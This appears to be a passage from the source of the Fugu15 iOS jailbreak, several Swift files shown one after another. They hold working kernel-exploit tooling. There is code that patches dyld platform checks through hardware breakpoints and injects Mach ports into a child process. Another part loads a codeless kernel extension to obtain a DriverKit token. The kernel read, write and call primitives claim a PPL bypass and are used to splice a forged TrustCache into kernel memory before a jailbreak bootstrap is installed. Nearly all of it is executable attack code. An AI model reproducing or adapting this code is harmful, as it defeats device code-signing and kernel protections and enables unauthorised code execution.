        guard let getEntryFunc = (try? dyld.getSymbolTable())?.symbol(forName: "__ZNK5dyld313MachOAnalyzer8getEntryERyRb")?.value else {
            throw DyldPatchSetupError.noDyld3MachOAnalyzerGetEntry
        }
        
        guard let textSegment = dyld.pfSegment(forName: "__TEXT") else {
            throw DyldPatchSetupError.noDyldTextSegment
        }
        
        var getEntryXref: UInt64?
        var curAddr: UInt64?
        
    outer:
        while let xref = textSegment.findNextXref(to: getEntryFunc, startAt: curAddr) {
            for i in 1..<20 {
                let pc = xref - UInt64(i * 4)
                let instr = textSegment.instruction(at: pc) ?? 0
                if let args = AArch64Instr.Args.cmp(instr) {
                    if args.isImm && args.shift == 0 && args.immOrRegB == 0xA {
                        // Found it
                        getEntryXref = pc - 4
                        curPlatReg = args.regA
                        break outer
                    }
                }
            }
            
            curAddr = xref + 4
        }
        
        guard let curPlatCheck = getEntryXref else {
            throw DyldPatchSetupError.noDyldCurrentPlatformCheck
        }
        
        Logger.fmt("CP: %p", curPlatCheck)
        Logger.fmt("GE: %p", getEntryFunc)
        
        guard var state: arm_thread_state64_t = th.getState(type: ARM_THREAD_STATE64) else {
            throw DyldPatchSetupError.failedToGetThreadState
        }
        
        guard var dbgState: arm_debug_state64_t = th.getState(type: ARM_DEBUG_STATE64) else {
            throw DyldPatchSetupError.failedToGetThreadDebugState
        }
        
        base = thread_state64_get_pc(&state) &- entry
        
        curPlat  = base &+ curPlatCheck
        getEntry = base &+ getEntryFunc
        
        dbgState.__bcr.0 = BP_BAS | BP_USER | BP_ENABLED
        dbgState.__bvr.0 = curPlat
        
        dbgState.__bcr.1 = BP_BAS | BP_USER | BP_ENABLED
        dbgState.__bvr.1 = getEntry
        
        guard th.setState(type: ARM_DEBUG_STATE64, state: dbgState) else {
            throw DyldPatchSetupError.failedToSetThreadDebugState
        }
    }
    
    private func handleException(thread th: Thread, entryPoint: UInt64, checkinData: DKCheckinData, exceptionHandler: SpawnDrvExceptionHandler) throws -> kern_return_t {
        guard var state: arm_thread_state64_t = th.getState(type: ARM_THREAD_STATE64) else {
            throw HandleExceptionError.failedToGetThreadState
        }
        
        let pc = thread_state64_get_pc(&state)
        let lr = thread_state64_get_lr(&state)
        
        Logger.fmt("Exception occured @ %p [%p]", pc, pc &- base)
        Logger.fmt("LR: %p [%p]", lr, lr &- base)
        
        if pc == curPlat {
            // Why is state.__x not an array?!
            withUnsafeMutablePointer(to: &state.__x.0) { ptr in
                ptr[Int(curPlatReg)] = 0
            }
            
            thread_state64_set_pc(&state, pc + 4)
        } else if pc == getEntry {
            child.w64(state.__x.1, entryPoint)
            child.w8(state.__x.2, 0)
            
            state.__x.0 = 1
            
            thread_state64_set_pc(&state, lr)
            
        // SpawnDrv also provides some magic functions
        } else if pc == 0x4142434400 {
            // Send token and tag
            var token = mach_port_t.max
            for i in 0..<mach_port_t.max {
                // Why is there no proper API to inject a mach port into another process?
                if mach_port_insert_right(child.tp, i, checkinData.token, mach_msg_type_name_t(MACH_MSG_TYPE_COPY_SEND)) == KERN_SUCCESS {
                    token = i
                    break
                }
            }
            
            child.w64(state.__x.0, UInt64(token))
            child.w64(state.__x.1, checkinData.tag)
            
            thread_state64_set_pc(&state, lr)
        } else {
            let kr = exceptionHandler(self, child, th, &state)
            guard kr == KERN_SUCCESS else {
                Logger.print("\(state)")
                Logger.print("\(state.__x.0)")
                Logger.print("\(child.r32(pc))")
                Logger.print("OOPS")
                return kr
            }
        }
        
        guard th.setState(type: ARM_THREAD_STATE64, state: state) else {
            throw HandleExceptionError.failedToSetThreadState
        }
        
        return KERN_SUCCESS
    }
    
    public enum DyldPatchSetupError: Error {
        case failedToOpenDyld
        case badDyldThreadState
        case noDyldEntryPoint
        case noDyld3MachOAnalyzerGetEntry
        case noDyldTextSegment
        case noDyldCurrentPlatformCheck
        case failedToGetThreadState
        case failedToGetThreadDebugState
        case failedToSetThreadDebugState
    }

    public enum HandleExceptionError: Error {
        case failedToGetThreadState
        case failedToSetThreadState
    }
}

```

`Packages/Fugu15KernelExploit/Sources/Fugu15KernelExploit/SpawnDrv/tp.swift`:

```swift
//
//  arm64Handler.swift
//  Fugu15KernelExploit/SpawnDrv
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

import Foundation
import Darwin

// Swift wrapper for some Mach APIs

class Task {
    var tp: mach_port_t
    
    var threads: [Thread] {
        var threadList: thread_act_array_t!
        var thCount: mach_msg_type_number_t = 0
        guard task_threads(tp, &threadList, &thCount) == KERN_SUCCESS,
              threadList != nil,
              thCount >= 1 else {
            return []
        }
        
        var res = [Thread]()
        for i in 0..<Int(thCount) {
            res.append(Thread(tp: threadList[i]))
        }
        
        vm_deallocate(mach_task_self_, UInt(bitPattern: threadList), vm_size_t(MemoryLayout<thread_act_t>.size * Int(thCount)))
        
        return res
    }
    
    init(tp: mach_port_t) {
        self.tp = tp
    }
    
    static func forPID(_ pid: pid_t) -> Task? {
        var tp: mach_port_name_t = 0
        guard task_for_pid(mach_task_self_, pid, &tp) == KERN_SUCCESS else {
            return nil
        }
        
        return Task(tp: tp)
    }
    
    func read(addr: UInt64, size: Int) -> Data? {
        var data = Data(repeating: 0, count: size)
        var len = vm_size_t(size)
        
        let kr = data.withUnsafeMutableBytes { (ptr: UnsafeMutableRawBufferPointer) in
            vm_read_overwrite(tp, vm_address_t(addr), vm_size_t(size), vm_address_t(UInt(bitPattern: ptr.baseAddress!)), &len)
        }
        
        guard kr == KERN_SUCCESS else {
            return nil
        }
        
        return data.trySubdata(in: 0..<Int(len))
    }
    
    func r64(_ addr: UInt64) -> UInt64 {
        return read(addr: addr, size: 8)!.getGeneric(type: UInt64.self)
    }
    
    func r32(_ addr: UInt64) -> UInt32 {
        return read(addr: addr, size: 4)!.getGeneric(type: UInt32.self)
    }
    
    func write(addr: UInt64, data: Data) {
        _ = data.withUnsafeBytes { (ptr: UnsafeRawBufferPointer) in
            vm_write(tp, vm_address_t(addr), vm_offset_t(UInt(bitPattern: ptr.baseAddress!)), mach_msg_type_number_t(ptr.count))
        }
    }
    
    func w8(_ addr: UInt64, _ value: UInt8) {
        write(addr: addr, data: Data(fromObject: value))
    }
    
    func w64(_ addr: UInt64, _ value: UInt64) {
        write(addr: addr, data: Data(fromObject: value))
    }
    
    func suspend() {
        task_suspend(tp)
    }
    
    func resume() {
        task_resume(tp)
    }
}

class Thread {
    var tp: mach_port_t
    
    init(tp: mach_port_t) {
        self.tp = tp
    }
    
    func getState<S>(type: Int32) -> S? {
        let state = UnsafeMutablePointer<S>.allocate(capacity: 1)
        var stateLen = mach_msg_type_number_t(MemoryLayout.size(ofValue: state.pointee) >> 2)
        guard thread_get_state(tp, type, thread_state_t(bitPattern: UInt(bitPattern: state)), &stateLen) == KERN_SUCCESS else {
            return nil
        }
        
        let res = state.pointee
        state.deallocate()
        
        return res
    }
    
    func setState<S>(type: Int32, state: S) -> Bool {
        var state = state
        let stateLen = mach_msg_type_number_t(MemoryLayout.size(ofValue: state) >> 2)
        let kr = withUnsafeMutablePointer(to: &state) { ptr -> kern_return_t in
            return thread_set_state(tp, type, thread_state_t(bitPattern: UInt(bitPattern: ptr)), stateLen)
        }
        
        return kr == KERN_SUCCESS
    }
}

```

`Packages/Fugu15KernelExploit/Sources/Fugu15KernelExploit/codelessKext.swift`:

```swift
//
//  codelessKext.swift
//  kexploitd
//
//  Created by Linus Henze.
//  Copyright © 2021/2022 Pinauten GmbH. All rights reserved.
//

import Foundation

public typealias DKCheckinData = (token: mach_port_t, tag: UInt64)

func sendKextRequestWithDataReply(req: Any, res: inout kern_return_t) throws -> Data? {
    var resp: vm_offset_t = 0
    var respLen: mach_msg_type_number_t = 0
    
    var log: vm_offset_t = 0
    var logLen: mach_msg_type_number_t = 0
    
    let dat = try PropertyListSerialization.data(fromPropertyList: req, format: .xml, options: .zero) + Data(repeating: 0, count: 1)
    let kr = dat.withUnsafeBytes { (ptr) -> kern_return_t in
        return kext_request(mach_host_self(), 65536, vm_offset_t(bitPattern: ptr.baseAddress!), mach_msg_type_number_t(ptr.count), &resp, &respLen, &log, &logLen, &res)
    }
    
    if kr != KERN_SUCCESS {
        res = kr
        return nil
    }
    
    if log != 0 {
        vm_deallocate(mach_task_self_, log, vm_size_t(logLen))
        log = 0
        logLen = 0
    }
    
    if resp == 0 {
        return nil
    }
    
    let resData = Data(bytesNoCopy: UnsafeMutableRawPointer(bitPattern: resp)!, count: Int(respLen), deallocator: .unmap)
    return resData
}

public func sendKextRequestWithReply(req: Any, res: inout kern_return_t) throws -> Any? {
    if let res = try sendKextRequestWithDataReply(req: req, res: &res) {
        let str = String(decoding: res, as: UTF8.self)
        if str != "" {
            return try PropertyListSerialization.propertyList(from: str.replacingOccurrences(of: "<set", with: "<array").replacingOccurrences(of: "</set", with: "</array").data(using: .utf8)!, options: .init(), format: nil)
        }
        
        return try PropertyListSerialization.propertyList(from: res, options: .init(), format: nil)
    }
    
    return nil
}

func sendRequest(req: Any) throws -> kern_return_t {
    var kr: kern_return_t = 0
    _ = try sendKextRequestWithReply(req: req, res: &kr)
    
    return kr
}

func loadCodelessKext(bundleName: String) throws -> kern_return_t {
    let req = [
        "Kext Request Predicate": "LoadCodelessKext",
        "Kext Request Arguments": [
            "CFBundleIdentifier": bundleName,
            "Codeless Kext Info": [
                "_CodelessKextBundlePath": "<none>",
                "CFBundleIdentifier": bundleName,
                "CFBundleVersion": "1.0",
                "CFBundlePackageType": "DEXT",
                "IOKitPersonalities": [
                    "PWN": [
                        "CFBundleIdentifier": bundleName,
                        "CFBundleIdentifierKernel": "com.apple.kpi.iokit",
                        "IOClass": "IOUserService",
                        "IOMatchCategory": "PWNDriver",
                        "IOProviderClass": "IOPCIDevice",
                        "IOResourceMatch": "IOKit",
                        "IOUserClass": "oobPCIDriver",
                        "IOUserServerName": "oobPCIDriver",
                        "IONameMatch": "wlan",
                        "PWNProps": [
                            "IOClass": "IOUserUserClient",
                            "IOUserClass": "PWNDriverUC"
                        ]
                    ]
                ]
            ]
        ]
    ] as Any
    
    return try sendRequest(req: req)
}

public func getDKCheckinData() -> (token: mach_port_t, tag: UInt64)? {
    // Generate random kext bundle name
    let bundleName = String(format: "de.pinauten.pwn-%p-%p", arc4random(), arc4random())
    
    // Attempt to load codeless kext first
    guard let kr = try? loadCodelessKext(bundleName: bundleName),
          kr == KERN_SUCCESS else {
        return nil
    }
    
    // Now get launch request
    let req = [
        "Kext Request Predicate": "Get Kernel Requests",
        "Kext Request Arguments": [
            "CFBundleIdentifier": bundleName
        ]
    ] as Any
    
    var result: (token: mach_port_t, tag: UInt64)?
    
    for _ in 0..<500 {
        var kr: kern_return_t = 0
        if let res = try? sendKextRequestWithReply(req: req, res: &kr) as? [[String: Any]] {
            for x in res {
                // That's a really long if statement...
                if let pred = x["Kext Request Predicate"] as? String,
                   pred == "Dext Daemon Launch",
                   let args = x["Kext Request Arguments"] as? [String: Any],
                   let bundle = args["CFBundleIdentifier"] as? String,
                   bundle.starts(with: "de.pinauten.pwn-"),
                   let token = args["Check In Token"] as? mach_port_t,
                   let tag = args["Driver Extension Server Tag"] as? UInt64 {
                    // ...'then' part starts here...
                    if result == nil {
                        result = (token: token, tag: tag)
                    } else {
                        if token != result.unsafelyUnwrapped.token {
                            mach_port_destroy(mach_task_self_, token)
                        }
                    }
                }
            }
            
            if result != nil {
                break
            }
        }
    }
    
    return result
}

```

`Packages/Fugu15KernelExploit/Sources/Fugu15KernelExploit/iDownloadCmds.swift`:

```swift
//
//  iDownloadCmds.swift
//  Fugu15KernelExploit
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

import Foundation
import iDownload

let iDownloadCmds = [
    "help": iDownload_help,
    "autorun": iDownload_autorun,
    "tcload": iDownload_tcload,
    "bootstrap": iDownload_bootstrap,
    "uninstall": iDownload_uninstall
] as [String: iDownloadCmd]

func iDownload_help(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    try hndlr.sendline("tcload <path to TrustCache>: Load a TrustCache")
    try hndlr.sendline("bootstrap:                   Extract bootstrap.tar to /private/preboot/jb")
    try hndlr.sendline("uninstall:                   Remove Procursus, Sileo and /var/jb symlink")
}

func iDownload_autorun(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    if access("/private/preboot/jb/TrustCache", F_OK) == 0 {
        try iDownload_tcload(hndlr, "tcload", ["/private/preboot/jb/TrustCache"])
        _ = try? hndlr.exec("/sbin/mount", args: ["-u", "/private/preboot"])
        
        if access("/var/jb/Applications/Sileo.app", F_OK) == 0 {
            _ = try? hndlr.exec("/var/jb/usr/bin/uicache", args: ["-p", "/var/jb/Applications/Sileo.app"])
        }
    }
}

func iDownload_tcload(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    if args.count != 1 {
        try hndlr.sendline("Usage: tcload <path to TrustCache>")
        return
    }
    
    guard let krw = hndlr.krw else {
        throw iDownloadError.custom("No KRW support!")
    }
    
    let tcPath = hndlr.resolve(path: args[0])
    guard let data = try? Data(contentsOf: URL(fileURLWithPath: tcPath)) else {
        throw iDownloadError.custom("Failed to read trust cache!")
    }
    
    // Make sure the trust cache is good
    guard data.count >= 0x18 else {
        throw iDownloadError.custom("Trust cache is too small!")
    }
    
    let vers = data.getGeneric(type: UInt32.self)
    guard vers == 1 else {
        throw iDownloadError.custom(String(format: "Trust cache has bad version (must be 1, is %u)!", vers))
    }
    
    let count = data.getGeneric(type: UInt32.self, offset: 0x14)
    guard data.count == 0x18 + (Int(count) * 22) else {
        throw iDownloadError.custom(String(format: "Trust cache has bad length (should be %p, is %p)!", 0x18 + (Int(count) * 22), data.count))
    }
    
    guard let pmap_image4_trust_caches = Fugu15.patchfinder?.pmap_image4_trust_caches else {
        throw iDownloadError.custom("Failed to patchfind pmap_image4_trust_caches!")
    }
    
    var mem: UInt64!
    do {
        mem = try krw.kalloc(size: UInt(data.count + 0x10))
    } catch let e {
        throw KRWError.customError(description: "Failed to allocate kernel memory for TrustCache: \(e)")
    }
    
    let next = KRWAddress(address: mem, options: [])
    let us   = KRWAddress(address: mem + 0x8, options: [])
    let tc   = KRWAddress(address: mem + 0x10, options: [])
    
    do {
        try krw.kwrite(address: us, data: Data(fromObject: mem + 0x10))
        try krw.kwrite(address: tc, data: data)
    } catch let e {
        throw KRWError.customError(description: "Failed to write to our TrustCache: \(e)")
    }
    
    let pitc = KRWAddress(address: pmap_image4_trust_caches + hndlr.slide, options: .PPL)
    
    // Read head
    guard let cur = krw.r64(pitc) else {
        throw KRWError.customError(description: "Failed to read TrustCache head!")
    }
    
    // Write into our list entry
    try krw.kwrite(address: next, data: Data(fromObject: cur))
    
    // Replace head
    try krw.kwrite(address: pitc, data: Data(fromObject: mem.unsafelyUnwrapped))
    
    try hndlr.sendline("Successfully loaded TrustCache!")
}

func iDownload_bootstrap(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    let bootstrap_tar = Bundle.main.bundleURL.appendingPathComponent("bootstrap.tar").path
    let tar           = Bundle.main.bundleURL.appendingPathComponent("tar").path
    let trustCache    = Bundle.main.bundleURL.appendingPathComponent("TrustCache").path
    let sileo         = Bundle.main.bundleURL.appendingPathComponent("sileo.deb").path
    
    guard access(bootstrap_tar, F_OK) == 0 else {
        throw iDownloadError.custom("bootstrap.tar does not exist!")
    }
    
    guard access(tar, F_OK) == 0 else {
        throw iDownloadError.custom("tar does not exist!")
    }
    
    guard access(trustCache, F_OK) == 0 else {
        throw iDownloadError.custom("TrustCache for tar does not exist!")
    }
    
    try? FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: tar)
    
    try hndlr.sendline("Re-Mounting /private/preboot...")
    do {
        let exit = try hndlr.exec("/sbin/mount", args: ["-u", "/private/preboot"])
        if exit != 0 {
            throw iDownloadError.custom("mount failed: exit status: \(exit)")
        }
    } catch iDownloadError.execError(status: let status) {
        throw iDownloadError.custom("Failed to exec mount: posix_spawn error \(status) (\(String(cString: strerror(status)))")
    } catch iDownloadError.childDied(signal: let signal) {
        throw iDownloadError.custom("mount died: Signal: \(signal)")
    }
    
    try hndlr.sendline("Loading tar TrustCache...")
    try iDownload_tcload(hndlr, "tcload", [trustCache])
    
    try hndlr.sendline("Creating bootstrap dir")
    try? FileManager.default.removeItem(atPath: "/private/preboot/jb")
    try FileManager.default.createDirectory(atPath: "/private/preboot/jb", withIntermediateDirectories: false, attributes: nil)
    
    try hndlr.sendline("Extracting bootstrap.tar...")
    do {
        let exit = try hndlr.exec(tar, args: ["-xvf", bootstrap_tar], cwd: "/private/preboot/jb")
        if exit != 0 {
            throw iDownloadError.custom("tar failed: exit status: \(exit)")
        }
    } catch iDownloadError.execError(status: let status) {
        throw iDownloadError.custom("Failed to exec tar: posix_spawn error \(status) (\(String(cString: strerror(status)))")
    } catch iDownloadError.childDied(signal: let signal) {
        throw iDownloadError.custom("tar died: Signal: \(signal)")
    }
    
    if access("/private/preboot/jb/TrustCache", F_OK) == 0 {
        try hndlr.sendline("Loading bootstrap.tar TrustCache...")
        try iDownload_tcload(hndlr, "tcload", ["/private/preboot/jb/TrustCache"])
    }
    
    try hndlr.sendline("Creating /var/jb symlink...")
    try? FileManager.default.removeItem(atPath: "/var/jb")
    try? FileManager.default.createSymbolicLink(atPath: "/var/jb", withDestinationPath: "/private/preboot/jb")
    
    try hndlr.sendline("Running bootstrap.sh...")
    var status = try hndlr.exec("/var/jb/usr/bin/sh", args: ["/var/jb/prep_bootstrap.sh"])
    
    try hndlr.sendline("prep_bootstrap.sh: \(status)")
    
    if access(sileo, F_OK) == 0 {
        try hndlr.sendline("Installing Sileo...")
        status = try hndlr.exec("/var/jb/usr/bin/dpkg", args: ["-i", sileo])
        
        try hndlr.sendline("dpkg: \(status)")
        
        status = try hndlr.exec("/var/jb/usr/bin/uicache", args: ["-p", "/var/jb/Applications/Sileo.app"])
        
        try hndlr.sendline("uicache: \(status)")
    }
    
    try hndlr.sendline("Done")
}

func iDownload_uninstall(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    if access("/var/jb/Applications/Sileo.app", F_OK) == 0 {
        try hndlr.sendline("Removing Sileo...")
        _ = try? hndlr.exec("/var/jb/usr/bin/uicache", args: ["-u", "/var/jb/Applications/Sileo.app"])
    }
    
    if access("/private/preboot/jb", F_OK) == 0 {
        try hndlr.sendline("Removing bootstrap...")
        try? FileManager.default.removeItem(atPath: "/private/preboot/jb")
    }
    
    try hndlr.sendline("Removing /var/jb symlink...")
    try? FileManager.default.removeItem(atPath: "/var/jb")
    
    try hndlr.sendline("Done")
}

```

`Packages/Fugu15KernelExploit/Sources/Fugu15KernelExploit/iDownloadKRW.swift`:

```swift
//
//  iDownloadKRW.swift
//  Fugu15KernelExploit
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

import Foundation
import iDownload

public class iDownloadKRW: KRWHandler {
    func doRequest(id: UInt64, addr: UInt64, size: UInt64, buf: Data?) throws -> (status: UInt64, result: UInt64, data: Data?) {
        let res = Fugu15.oobPCIRequest(id: id, addrPid: addr, size: size, buf: buf)
        
        if Int64(bitPattern: res.status) < 0 {
            if let d = res.data {
                if let s = String(data: d, encoding: .utf8) {
                    throw KRWError.customError(description: s)
                }
            }
            
            throw KRWError.customError(description: "Unknown: \(res.status)")
        }
        
        return res
    }
    
    public func getSupportedActions() -> KRWOptions {
        return [.virtRW, .physRW, .kalloc, .kcall, .PPLBypass]
    }
    
    public func getInfo() throws -> (kernelBase: UInt64, slide: UInt64) {
        return (kernelBase: Fugu15.kernelBase, slide: Fugu15.kernelSlide)
    }
    
    public func resolveAddress(forName: String) throws -> KRWAddress? {
        return nil
    }
    
    public func kread(address: KRWAddress, size: UInt) throws -> Data {
        if address.options.contains(.physical) {
            let res = try doRequest(id: 1, addr: address.address, size: UInt64(size), buf: nil)
            
            return res.data ?? Data()
        } else {
            let res = try doRequest(id: 0, addr: address.address, size: UInt64(size), buf: nil)
            
            return res.data ?? Data()
        }
    }
    
    public func kwrite(address: KRWAddress, data: Data) throws {
        var id: UInt64 = address.options.contains(.physical) ? 3 : 2
        if address.options.contains(.PPL) {
            id += 2
        }
        
        _ = try doRequest(id: id, addr: address.address, size: UInt64(data.count), buf: data)
    }
    
    public func kalloc(size: UInt) throws -> UInt64 {
        guard let kallocAddr = Fugu15.patchfinder?.kalloc_data_external else {
            throw KRWError.customError(description: "Failed to find kalloc_data_external!")
        }
        
        for _ in 0..<1024 {
            let res = try kcall(func: KRWAddress(address: kallocAddr + Fugu15.kernelSlide, options: []), a1: UInt64(size), a2: 1, a3: 0, a4: 0, a5: 0, a6: 0, a7: 0, a8: 0)
            if res != 0 {
                return res
            }
        }
        
        throw KRWError.customError(description: "kalloc_data_external failed to allocate!")
    }
    
    public func kfree(address: UInt64) throws {
        throw KRWError.notSupported
    }
    
    public func kcall(func: KRWAddress, a1: UInt64, a2: UInt64, a3: UInt64, a4: UInt64, a5: UInt64, a6: UInt64, a7: UInt64, a8: UInt64) throws -> UInt64 {
        guard !`func`.options.contains(.physical) else {
            // Nope, can't do that without disabling MMU (hardware prevents that)
            throw KRWError.customError(description: "Physical kcall not supported!")
        }
        
        guard !`func`.options.contains(.PPL) else {
            // Support could be added by e.g. making the PPL stack kernel writeable
            // and then triggering an exception in PPL, making sure a fault handler
            // is set that jumps to e.g. x22
            // The kernel will then update the PPL register state on the stack and return to PPL
            // which will then jump to x22
            throw KRWError.customError(description: "PPL kcall not supported!")
        }
        
        var data = Data(fromObject: a1)
        data.appendGeneric(value: a2)
        data.appendGeneric(value: a3)
        data.appendGeneric(value: a4)
        data.appendGeneric(value: a5)
        data.appendGeneric(value: a6)
        data.appendGeneric(value: a7)
        data.appendGeneric(value: a8)
        
        let res = try doRequest(id: 6, addr: `func`.address, size: UInt64(data.count), buf: data)
        
        return res.result
    }
}

```

`Packages/Fugu15KernelExploit/Sources/Fugu15KernelExploit/krw.swift`:

```swift
//
//  krw.swift
//  Fugu15KernelExploit
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//  

import Foundation

// FIXME: Implement proper KRW

public class Fugu15KRW {
    public init(dkServerPort: mach_port_t, devPort: mach_port_t) {
        
    }
}

```

`Packages/Fugu15KernelExploit/Sources/Fugu15KernelExploit/oobPCI.swift`:

```swift
//
//  Fugu15.swift
//  Fugu15KernelExploit
//
//  Created by Linus Henze.
//  Copyright © 2021/2022 Pinauten GmbH. All rights reserved.
//

import Foundation
import ProcessCommunication
import CBindings
import KernelPatchfinder
import iDownload

extension Fugu15 {
    internal static func serverMain(checkin: DKCheckinData) -> Never {
        setsid()
        
        let controlIn = FileHandle(fileDescriptor: Int32(CommandLine.arguments[2])!, closeOnDealloc: true)
        let controlOut = FileHandle(fileDescriptor: Int32(CommandLine.arguments[3])!, closeOnDealloc: true)
        
        let comm = ProcessCommunication(read: controlIn, write: controlOut)
        
        var exitStatus: Int32?
        var done = false
        var exceptionHandler: UInt64?
        var detach = false
        
        while true {
            guard let cmd = comm.receiveCommand() else {
                // Probably broken pipe
                if !detach {
                    exit(-1)
                }
                
                Logger.logFileHandle = nil
                dispatchMain()
            }
            
            switch cmd[0] {
            case "ping":
                Logger.print("Hello from kernel exploit server!")
                Logger.print("My UID is \(getuid())")
                Logger.print("My GID is \(getgid())")
                
                comm.sendCommand("pong")
                
            case "pwn":
                do {
                    Logger.status("Launching oobPCI")
                    
                    guard cmd.count == 2 else {
                        comm.sendCommand("error", "Usage: pwn <oobPCI path>")
                        
                        break
                    }
                    
                    var args: [String] = []
                    if ProcessInfo.processInfo.operatingSystemVersion.minorVersion == 5 {
                        args.append("155")
                    }
                    
                    let driver = SpawnDrv(executable: URL(fileURLWithPath: cmd[1]))
                    driver.onExit { driver, status in
                        exitStatus = status
                    }
                    
                    try driver.launch(arguments: args, checkinData: checkin) { driver, task, thread, state in
                        let pc = thread_state64_get_pc(&state)
                        let lr = thread_state64_get_lr(&state)
                        
                        switch pc {
                        case 0x4142434404:
                            // Done notification
                            Logger.print("Got child notification!")
                            Logger.print(String(format: "Kernel base @ %p", state.__x.0))
                            Logger.print(String(format: "Kernel slide %p", state.__x.0 &- 0xFFFFFFF007004000))
                            Logger.print(String(format: "Virtual base @ %p", state.__x.1))
                            Logger.print(String(format: "Physical base @ %p", state.__x.2))
                            
                            kernelBase  = state.__x.0
                            kernelSlide = state.__x.0 &- 0xFFFFFFF007004000
                            
                            // Lock both locks to ensure threads will block later on
                            // FIXME: This should be somewhere else
                            sendRequestLock.lock()
                            replyLock.lock()
                            
                            done = true
                            
                        case 0x4841585800:
                            // Patchfind
                            return handlePatchfindRequest(driver, task, thread, &state)
                            
                        case 0x4841585808:
                            // Set exception handler
                            exceptionHandler = state.__x.0
                            break
                            
                        case 0x484158580C:
                            // Get request
                            // Attempt to lock the send request lock
                            // (This will block until we have something to send)
                            sendRequestLock.lock()
                            
                            // Ensure all writes are visible
                            OSMemoryBarrier()
                            
                            // Copy Request over to child
                            task.w64(state.__x.0, requestAddrPid)
                            task.w64(state.__x.1, requestSize)
                            if let rb = requestBuf {
                                task.write(addr: state.__x.2, data: rb)
                            }
                            
                            state.__x.0 = request
                            
                        case 0x4841585810:
                            // Set reply values
                            replyStatus = state.__x.0
                            replyResult = state.__x.1
                            if state.__x.3 != 0 {
                                replyBuf = task.read(addr: state.__x.2, size: Int(state.__x.3))
                            } else {
                                replyBuf = nil
                            }
                            
                            // Ensure all writes are visible
                            OSMemoryBarrier()
                            
                            replyLock.unlock()
                            
                        case 0x4841585814:
                            // Kernel exploit done notification
                            Logger.print("Attempting to copy out DK ports...")
                            let dkServerPortName = mach_port_name_t(state.__x.0)
                            let devPortName      = mach_port_name_t(state.__x.1)
                            
                            var dkServerPort: mach_port_t = 0
                            var devPort:      mach_port_t = 0
                            
                            var acquired: mach_msg_type_name_t = 0
                            
                            var kr = mach_port_extract_right(task.tp, dkServerPortName, mach_msg_type_name_t(MACH_MSG_TYPE_COPY_SEND), &dkServerPort, &acquired)
                            guard kr == KERN_SUCCESS else {
                                Logger.print("Failed to copyout dkServerPort: \(kr)")
                                return KERN_FAILURE
                            }
                            
                            kr = mach_port_extract_right(task.tp, devPortName, mach_msg_type_name_t(MACH_MSG_TYPE_COPY_SEND), &devPort, &acquired)
                            guard kr == KERN_SUCCESS else {
                                Logger.print("Failed to copyout devPort: \(kr)")
                                return KERN_FAILURE
                            }
                            
                            Logger.print("Copied out DK ports!")
                            
                            // FIXME: Initialize KRW here...
                            
                        default:
                            if let exceptionHandler = exceptionHandler {
                                thread_state64_set_pc(&state, exceptionHandler)
                                return KERN_SUCCESS
                            } else {
                                return KERN_FAILURE
                            }
                        }
                        
                        thread_state64_set_pc(&state, lr)
                        return KERN_SUCCESS
                    }
                    
                    comm.sendCommand("ok")
                } catch let e {
                    Logger.print("SpawnDriver failed: \(e)")
                    
                    comm.sendCommand("error", "SpawnDrv failed!")
                }
                
            case "waitUntilDone":
                while !done && exitStatus == nil {
                    usleep(10000)
                }
                
                if done {
                    /*if let mapped = oobPCIMapMagicPage(pid: getpid()) {
                        Logger.print("Mapped: \(String(format: "%p", mapped.magicPageUInt64))")
                        Logger.print("Content: \(String(format: "%p", mapped.magicPage[0]))")
                        
                        comm.sendCommand("done")
                    } else {
                        Logger.print("Uh-oh, oobPCIMapMagicPage failed!")
                        
                        comm.sendCommand("error", "oobPCIMapMagicPage")
                    }*/
                    
                    comm.sendCommand("done")
                } else {
                    comm.sendCommand("error", "Exit status: \(exitStatus.unsafelyUnwrapped)")
                }
                
            case "launch_iDownload":
                while !done && exitStatus == nil {
                    usleep(10000)
                }
                
                if done {
                    setenv("PATH", "/sbin:/bin:/usr/sbin:/usr/bin:/private/preboot/jb/sbin:/private/preboot/jb/bin:/private/preboot/jb/usr/sbin:/private/preboot/jb/usr/bin", 1)
                    setenv("TERM", "xterm-256color", 1)
                    
                    do {
                        try iDownload.launch_iDownload(krw: iDownloadKRW(), otherCmds: iDownloadCmds)
                        
                        detach = true
                        
                        comm.sendCommand("done")
                    } catch let e {
                        Logger.print("Failed to launch iDownload: \(e)")
                        
                        comm.sendCommand("error", "iDownload: \(e)")
                    }
                } else {
                    comm.sendCommand("error", "Exit status: \(exitStatus.unsafelyUnwrapped)")
                }
                
            default:
                comm.sendCommand("error", "Unknown command \(cmd[0])!")
            }
        }
    }
    
    internal static func handlePatchfindRequest(_ driver: SpawnDrv, _ child: Task, _ thread: Thread, _ state: inout arm_thread_state64_t) -> kern_return_t {
        // Patchfind stuff
        let offsetInfoAddr = state.__x.1
        func writeOffsetInfo(_ pos: Int, value: UInt64) {
            Logger.print("Pos \(pos): " + String(format: "%p", value))
            child.w64(offsetInfoAddr + UInt64(pos * 8), value)
        }
        
        var ok = false
        repeat {
            Logger.print("Loading kernel...")
            var start = time(nil)
            
            guard let pf = patchfinder else {
                Logger.print("Failed: KernelPatchfinder.running")
                break
            }
            
            Logger.print("Loading took \(time(nil) - start) second(s)!")
            
            Logger.print("Patchfinding...")
            
            start = time(nil)
            
            writeOffsetInfo(0, value: state.__x.0 &- 0xFFFFFFF007004000) // Kernel slide
            
            guard let allproc = pf.allproc else {
                Logger.print("Failed: pf.allproc")
                break
            }
            
            writeOffsetInfo(1, value: allproc)
            
            guard let ITK_SPACE = pf.ITK_SPACE else {
                Logger.print("Failed: pf.ITK_SPACE")
                break
            }
            
            writeOffsetInfo(2, value: ITK_SPACE)
            
            guard let cpu_ttep = pf.cpu_ttep else {
                Logger.print("Failed: pf.cpu_ttep")
                break
            }
            
            writeOffsetInfo(3, value: cpu_ttep)
            
